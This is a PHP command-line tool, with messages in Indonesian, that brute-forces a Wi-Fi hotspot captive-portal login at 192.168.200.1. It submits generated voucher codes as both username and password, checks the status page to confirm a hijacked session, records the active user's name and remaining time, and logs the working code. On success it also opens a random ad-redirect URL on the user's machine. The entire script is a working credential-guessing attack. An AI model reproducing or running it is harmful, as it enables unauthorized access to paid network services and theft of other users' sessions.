#!/usr/bin/env php
<?php

// Konfigurasi Warna
$red = "\033[91m"; $green = "\033[92m"; $yellow = "\033[93m";
$cyan = "\033[96m"; $white = "\033[97m"; $reset = "\033[0m";
$banner = "\033[96m __      __.___         ___________.___ \n/  \    /  \   |        \_   _____/|   | \n\   \/\/   /   |  ______ |    __)  |   | \n \        /|   | /_____/ |     \   |   | \n  \__/\  / |___|         \___  /   |___| \n       \/                    \/\033[0m\n\n";

// DAFTAR URL ACAK BARU
$randomUrls = [
    'https://otieu.com/4/9518141',
    'https://otieu.com/4/9511256',
    'https://otieu.com/4/9511194',
    'https://otieu.com/4/9511257'
];

function generatePassword($upperCount, $lowerCount, $digitCount, $upperChars, $lowerChars, $digitChars) {
    $password = '';
    if (strlen($upperChars) == 0 && $upperCount > 0) return "[ERROR: SUMBER HURUF BESAR KOSONG]";
    if (strlen($lowerChars) == 0 && $lowerCount > 0) return "[ERROR: SUMBER HURUF KECIL KOSONG]";
    if (strlen($digitChars) == 0 && $digitCount > 0) return "[ERROR: SUMBER ANGKA KOSONG]";
    for ($i = 0; $i < $upperCount; $i++) { $password .= $upperChars[rand(0, strlen($upperChars) - 1)]; }
    for ($i = 0; $i < $lowerCount; $i++) { $password .= $lowerChars[rand(0, strlen($lowerChars) - 1)]; }
    for ($i = 0; $i < $digitCount; $i++) { $password .= $digitChars[rand(0, strlen($digitChars) - 1)]; }
    return $password;
}

function parseTimeToSeconds($timeStr) {
    $totalSeconds = 0;
    preg_match('/(\d+)h/', $timeStr, $hours); preg_match('/(\d+)m/', $timeStr, $minutes); preg_match('/(\d+)s/', $timeStr, $seconds);
    if (isset($hours[1])) { $totalSeconds += (int)$hours[1] * 3600; }
    if (isset($minutes[1])) { $totalSeconds += (int)$minutes[1] * 60; }
    if (isset($seconds[1])) { $totalSeconds += (int)$seconds[1]; }
    return $totalSeconds;
}

function liveCountdown($totalSeconds, $yellow, $reset) {
    echo $yellow;
    while ($totalSeconds > 0) {
        $hours = floor($totalSeconds / 3600);
        $minutes = floor(($totalSeconds % 3600) / 60);
        $seconds = $totalSeconds % 60;
        $countdown = sprintf("   - Menunggu... %02d:%02d:%02d", $hours, $minutes, $seconds);
        echo $countdown . "\r";
        sleep(1);
        $totalSeconds--;
    }
    echo "\n";
    echo $reset;
}

// Variabel dan file
$url = 'http://192.168.200.1/login';
$statusUrl = 'http://192.168.200.1/status';
$sourceFile = 'source.json'; $passwordFile = 'password.json'; $lastChoiceFile = 'last_choice.json';
$logFile = 'log.json'; $cookieFile = 'cookie.txt';

if (!file_exists($sourceFile) || !file_exists($passwordFile) || !file_exists($lastChoiceFile)) {
    echo $red."\n❗️ File `source.json`, `password.json`, atau `last_choice.json` tidak ditemukan.\n";
    echo "   Jalankan Menu 1 dan 2 dari skrip utama (`menu.php`) terlebih dahulu.\n\n".$reset;
    exit;
}
if (file_exists($cookieFile)) { unlink($cookieFile); }

while (true) {
    system('clear'); echo $banner;
    echo $cyan."Membaca batch password dari '$passwordFile'...\n";
    echo "Tekan Ctrl+C untuk berhenti.\n\n".$reset;

    $passwordJson = json_decode(file_get_contents($passwordFile), true);
    $passwords = $passwordJson['generated_passwords'];
    $found = false;

    foreach ($passwords as $password) {
        echo $white."   - Mencoba password: " . $yellow . $password . $white . " ... ".$reset;
        $data = "username=$password&password=$password&dst=&popup=true";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
        $response = curl_exec($ch);

        if (curl_errno($ch)) { echo $red."❌ cURL Error: " . curl_error($ch) . "\n".$reset; curl_close($ch); continue; }
        curl_close($ch);

        if (stripos($response, 'error') === false && stripos($response, 'gagal') === false && stripos($response, 'salah') === false) {
            $ch_status = curl_init();
            curl_setopt($ch_status, CURLOPT_URL, $statusUrl); curl_setopt($ch_status, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch_status, CURLOPT_COOKIEFILE, $cookieFile);
            $status_response = curl_exec($ch_status);
            curl_close($ch_status);

            if (stripos($status_response, 'Logout') !== false) {
                echo $green."✅ BERHASIL (Terverifikasi)!\n";
                echo "\n🎉🎉🎉\n".$white."Password yang ditemukan: " . $yellow . $password . $green . "\n🎉🎉🎉\n\n";
                
                $userAktif = 'N/A'; $sisaWaktu = 'N/A'; $detikTunggu = 0;
                preg_match('/<h3 id="user">(.*?)<\/h3>/', $status_response, $userMatches);
                if (isset($userMatches[1])) { $userAktif = $userMatches[1]; }
                preg_match('/Sisa Waktu.*?<td>(.*?)<\/td>/s', $status_response, $waktuMatches);
                if (isset($waktuMatches[1])) { $sisaWaktu = $waktuMatches[1]; $detikTunggu = parseTimeToSeconds($sisaWaktu); }
                
                echo $yellow."--- INFO SESI ---\n"; echo $white."User Aktif : " . $cyan . $userAktif . "\n"; echo $white."Sisa Waktu : " . $cyan . $sisaWaktu . "\n"; echo $yellow."-----------------\n\n".$reset;
                
                // --- LOGIKA BARU UNTUK URL ACAK ---
                $urlToOpen = $randomUrls[array_rand($randomUrls)];
                echo $cyan."🥂 Selamat Kamu berhasil login \n".$reset;
                shell_exec("xdg-open $urlToOpen");

                echo $yellow."   - Menunggu 5 detik sebelum membuka halaman status...\n".$reset;
                sleep(5);

                echo $cyan."🚀 Happy Browsing Guys !!!...\n".$reset;
                shell_exec("xdg-open $statusUrl");
                // --- AKHIR LOGIKA URL ACAK ---
                
                $logs = []; if (file_exists($logFile)) { $logs = json_decode(file_get_contents($logFile), true); if (!is_array($logs)) { $logs = []; } }
                $newLogEntry = ['timestamp' => date('Y-m-d H:i:s'), 'successful_password' => $password, 'user_aktif' => $userAktif, 'sisa_waktu' => $sisaWaktu];
                $logs[] = $newLogEntry;
                file_put_contents($logFile, json_encode($logs, JSON_PRETTY_PRINT));
                echo $green."\n✅ Log keberhasilan telah ditambahkan ke `$logFile`.\n".$reset;
                
                if ($detikTunggu > 0) {
                    echo $yellow . "\n✅ Login berhasil. Sesi akan ditutup setelah countdown selesai.\n" . $reset;
                    liveCountdown($detikTunggu, $yellow, $reset);
                }

                $found = true;
                break;
            } else {
                echo $red."❌ Gagal (Verifikasi Status Gagal)\n".$reset;
                sleep(1);
            }
        } else {
            echo $red."❌ Gagal\n".$reset;
            sleep(1);
        }
    }

    if ($found) { break; } 
    else {
        echo $yellow."\n--- Gagal menemukan password. Membuat 10 password baru... ---\n".$reset;
        $dataSumber = json_decode(file_get_contents($sourceFile), true);
        $sumberHurufBesar = $dataSumber['detail_input']['huruf']; $sumberAngka = $dataSumber['detail_input']['angka']; $sumberHurufKecil = $dataSumber['detail_input']['huruf_kecil'];
        $choiceJson = json_decode(file_get_contents($lastChoiceFile), true); $params = $choiceJson['params'];
        $newPasswords = []; for ($i = 0; $i < 10; $i++) { $newPasswords[] = generatePassword($params[0], $params[1], $params[2], $sumberHurufBesar, $sumberHurufKecil, $sumberAngka); }
        $outputData = ['timestamp' => date('Y-m-d H:i:s'), 'generated_passwords' => $newPasswords];
        file_put_contents($passwordFile, json_encode($outputData, JSON_PRETTY_PRINT));
        echo $cyan."--- Batch baru disimpan. Mengulang proses... ---\n".$reset;
        sleep(3);
    }
}

if (file_exists($cookieFile)) { unlink($cookieFile); }
